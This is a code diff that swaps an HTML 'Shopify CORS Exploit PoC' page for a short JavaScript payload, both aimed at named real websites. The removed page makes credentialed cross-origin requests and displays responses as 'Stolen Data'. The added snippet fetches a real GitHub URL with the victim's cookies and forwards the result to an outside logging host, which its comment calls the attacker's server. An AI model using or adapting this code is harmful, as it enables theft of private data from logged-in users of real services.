@@ -1,35 +1,6 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Shopify CORS Exploit PoC</title>
-</head>
-<body>
-    <h1>Shopify Data Leak PoC</h1>
-    <p>Target: <span id="target"></span></p>
-    <textarea id="output" style="width: 100%; height: 300px;" placeholder="Data will appear here if vulnerable..."></textarea>
-
-    <script>
-        // 1. SET YOUR TARGET ENDPOINT HERE
-        // Example:https://uat-bugbounty.nonprod.syfe.com//auth/api/internal/user_data
-        var targetUrl = "https://justeattakeaway.com/"; 
-        document.getElementById("target").innerText = targetUrl;
-
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4) {
-                if (xhr.status == 200) {
-                    document.getElementById("output").value = "SUCCESS! Stolen Data:\n\n" + xhr.responseText;
-                } else {
-                    document.getElementById("output").value = "FAILED. Status: " + xhr.status + "\nCheck DevTools Console for CORS errors.";
-                }
-            }
-        };
-
-        xhr.open("GET", targetUrl, true);
-        
-        // This is the most important part: sending Shopify session cookies
-        xhr.withCredentials = true; 
-        xhr.send();
-    </script>
-</body>
-</html>
+fetch("https://github.com/justeattakeaway", {credentials: "include"})
+  .then(response => response.json())
+  .then(data => {
+    // Send the victim's private data to the attacker's server
+    fetch("https://corsvulner.vercel.app//log?data=" + JSON.stringify(data));
+  });
